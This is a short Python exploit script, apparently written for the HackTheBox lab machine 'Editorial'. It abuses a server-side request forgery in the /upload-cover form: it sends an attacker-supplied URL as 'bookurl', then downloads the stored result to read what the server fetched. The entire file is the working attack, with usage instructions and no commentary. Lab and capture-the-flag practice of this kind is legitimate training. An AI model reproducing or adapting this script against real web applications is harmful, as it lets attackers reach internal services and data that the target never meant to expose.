import sys
import random, string
import requests
from requests_toolbelt import MultipartEncoder
from colorama import Fore, Style

def exploit(url):
	boundary = f"----WebKitFormBoundary{''.join(random.sample(string.ascii_letters + string.digits, 16))}"

	fields = {
		"bookurl": url,
		"bookfile": ("", "", "application/octet-stream")
	}
	data = MultipartEncoder(fields=fields, boundary=boundary)
	headers = {"Content-Type": data.content_type}

	r = requests.post("http://editorial.htb/upload-cover", data=data, headers=headers)
	img_url = r.text

	if img_url.endswith('.jpeg'):
		print(Fore.RED + "[-] Something went wrong." + Style.RESET_ALL)
		return

	r = requests.get(f"http://editorial.htb/{img_url}")
	print(r.text)

def main():
	if len(sys.argv) != 2:
		print("Usage: python ssrf.py <URL>")

		exit(0)

	ssrf_url = sys.argv[1]
	exploit(ssrf_url)

if __name__ == "__main__":
	main()